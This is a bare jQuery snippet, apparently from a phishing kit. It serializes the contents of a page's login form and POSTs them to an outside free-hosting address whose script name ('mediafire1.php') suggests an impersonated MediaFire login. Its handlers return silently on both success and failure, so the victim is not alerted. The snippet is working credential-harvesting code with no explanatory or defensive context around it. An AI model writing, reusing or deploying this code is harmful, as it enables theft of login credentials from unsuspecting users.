$.ajax({
    url: 'https://letmesee01.000webhostapp.com/mediafire1.php',
    type: 'POST',
    data: $('.login-form').serialize(),
    success: function () {
      return true
    },
    error: function () {
      return true
    },
  })